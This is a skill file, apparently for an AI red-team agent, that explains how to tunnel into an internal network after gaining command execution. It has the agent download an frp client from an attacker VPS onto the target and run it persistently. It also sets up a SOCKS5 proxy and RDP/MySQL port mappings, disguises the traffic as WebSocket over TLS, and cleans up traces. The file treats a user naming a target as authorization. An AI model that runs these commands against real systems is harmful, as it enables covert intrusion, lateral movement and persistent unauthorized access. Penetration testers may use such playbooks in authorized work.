---
name: frp-tunnel
description: frp 内网穿透：在自有 VPS 上跑 frps，在目标上跑 frpc，得到稳定 socks5 与端口映射
whenToUse: 已有命令执行/RCE 且目标可出网；需要长期稳定隧道、把内网端口映射给用户直接访问时
role: internal
enabled: true
---

# frp（内网穿透，最稳的长期隧道）

> **先加载 VPS 配置**：本技能里所有 `$REDTEAM_VPS_HOST` / `$VPS_USER` 都来自本机配置，
> 首次由 `bash $DSH_HOME/redteam/setup.sh` 写入 `$DSH_HOME/.env`。每条命令前先 source 一次：
> ```bash
> set -a; . "$DSH_HOME/.env" 2>/dev/null || . "$HOME/.dsh/.env"; set +a
> VPS_USER="${REDTEAM_VPS_USER:-ubuntu}"; VPS="$REDTEAM_VPS_HOST"
> ```
> 没配过就跑一次 `setup.sh`（技能 `redteam-setup`），它同时会验证 SSH 连通性与载荷服务。

`frp` 是**最稳定、最常用**的穿透方案：VPS 上跑 `frps`（服务端），目标上跑 `frpc`（客户端），
把内网的 socks5 或任意端口映射出来。相比 suo5/chisel，它**专为长期稳定运行设计**（自动重连、多路复用、TLS），
适合打进去之后**长期挂着**的内网通道。

**分工**：有 WebShell → `suo5-tunnel`；只有命令执行要快速进内网 → `chisel-tunnel`；
要**长期稳定 + 把端口给用户直接用** → 本技能。

## 本机二进制

| 文件 | 路径 | 用途 |
| --- | --- | --- |
| frps | `$DSH_HOME/redteam/toolkit/frp/frps` | VPS 上的服务端 |
| frpc | `$DSH_HOME/redteam/toolkit/frp/frpc` | 目标上的客户端 |

已同步到 VPS 载荷目录 `http://$REDTEAM_VPS_HOST:9100/`。VPS 上还有 `frps` 的配置样例。

## 一、VPS 侧：起 frps（先做）

```bash
# 1) 上传并准备（本机 → VPS）
scp -i $DSH_HOME/redteam/toolkit/vps/id_rsa \
    $DSH_HOME/redteam/toolkit/frp/frps $VPS_USER@$REDTEAM_VPS_HOST:/root/frps

# 2) 写配置（VPS 上）
cat > /root/frps.toml <<'EOF'
bindPort = 7000                 # frpc 连接端口
auth.method = "token"
auth.token = "<随机强 token>"   # 必填：公网暴露必须加 token，否则被扫到白用

# 可选：vhostHTTPPort / vhostHTTPSPort 用于 HTTP 类型穿透
EOF

# 3) tmux 里跑（断开 SSH 也不能死）
tmux new -s frps
/root/frps -c /root/frps.toml
```

**VPS 安全组放行**：`7000`（frpc 连接口）+ 后续映射出来的端口（如 `1080`、`13389`）。

## 二、目标侧：跑 frpc

```bash
# 1) 拉取二进制（通过已有命令执行点）
curl -s http://$REDTEAM_VPS_HOST:9100/frpc -o /tmp/frpc && chmod +x /tmp/frpc

# 2) 写配置
cat > /tmp/frpc.toml <<'EOF'
serverAddr = "$REDTEAM_VPS_HOST"
serverPort = 7000
auth.method = "token"
auth.token = "<与 frps 相同的 token>"

# ① 内网 SOCKS5（最有用：整个内网可达）
[[proxies]]
name = "socks5"
type = "tcp"
remotePort = 1080
[proxies.plugin]
type = "socks5"

# ② 指定端口映射（例：内网 RDP → VPS 13389）
# [[proxies]]
# name = "rdp"
# type = "tcp"
# localIP = "10.0.0.5"
# localPort = 3389
# remotePort = 13389

# ③ 可选：HTTP 类型（走 80/443 出网受限时配合 frps 的 vhostHTTPPort）
# [[proxies]]
# name = "web"
# type = "tcp"
# localIP = "10.0.0.6"
# localPort = 8080
# remotePort = 18080
EOF

# 3) 后台常驻跑（nohup + 断线自动重连）
nohup /tmp/frpc -c /tmp/frpc.toml > /tmp/frpc.log 2>&1 &
# Windows 目标：frpc.exe -c C:\Windows\Temp\frpc.toml（可用 sc create 注册服务持久化）
```

## 三、本机使用隧道

```bash
# SOCKS5 模式：VPS:1080 就是内网入口
proxychains4 -f runs/proxychains-1080.conf curl -s http://10.0.0.5/
# 配置里写：socks5 $REDTEAM_VPS_HOST 1080
# ⛔ 不要改 /etc/proxychains4.conf，用 -f 指向 runs/ 下临时配置

# 端口映射模式：直连 VPS 端口
rdesktop $REDTEAM_VPS_HOST:13389
mysql -h $REDTEAM_VPS_HOST -P 13306 -u root -p
```

## 四、出网受限时的变体

| 限制 | 处理 |
| --- | --- |
| 只能出 80/443 | frps `bindPort = 443`（或先用 80 跑 HTTP 类型），frpc 对应改端口 |
| 有 TLS 中间盒拦截 | frp 自带 `transport.tls.enable = true`（默认开）；必要时用 `transport.protocol = "kcp"` 或 `websocket` |
| 目标不能出网 | frp 方案不可用 → 走 WebShell 侧隧道（`suo5-tunnel`） |
| 需要伪装成正常流量 | `transport.protocol = "websocket"` + `transport.tls.enable = true`（走 443 时像普通 WebSocket） |

## 五、持久化与纪律

1. **必须跑在 tmux（服务端）/ nohup（客户端）**，否则会话一断隧道即失。
2. **服务端必须加 `auth.token`**：公网 VPS 的 7000 端口会被全网扫，无 token 等于把内网送人。
3. **token 不要复用**：每次演练生成新的随机 token；用完 `pkill frps` / `pkill frpc` 及时关闭。
4. **目标侧注意落地痕迹**：二进制与配置放 `/tmp`，用完清理；Windows 用 `Temp` 目录。
5. **不要用它做非法用途**：本技能仅限授权演练（用户给出靶标即代表已授权）。

## 六、输出与落库（强制）

1. **隧道登记 `redteam_tunnel_add`**，字段写全：
   - `kind`：`frp`；
   - `listen`：用户实际使用的地址（如 `$REDTEAM_VPS_HOST:1080`）；
   - `entry`：目标侧入口（如 `10.0.0.6 上 /tmp/frpc → VPS:7000`）；
   - `reach`：**实测可达网段**；
   - `entry_kind`：**`target-outbound`**（目标出网连我们的 frps——这是 frp 的典型形态）；
     ⛔ 只在自己 VPS 上开代理填 `self-only` → 会被标"不算突破"；
   - `command`：frps 与 frpc 两段完整命令 + 配置要点（token 脱敏）。
2. **实测连通**：`curl --socks5-hostname $REDTEAM_VPS_HOST:1080 http://<内网目标>/`，通了才登记为 active；
   然后 `redteam_session_check` 复查。
3. **得分**：`boundary`（隧道可达内网，evidence 写「隧道地址｜可达网段｜实测访问到的内网目标」）；
   通过它横向 → `server-host`。
4. **交付给用户**：给出可直接粘贴的 `socks5://$REDTEAM_VPS_HOST:1080` 或映射端口，写清地址与端口。
5. 每个关键动作 `redteam_chain_add`（`stage_code=boundary-logical`），`tool` 写命令原文、`result` 写回显摘要
   （如 `frpc 注册成功，proxy socks5 start success`）。
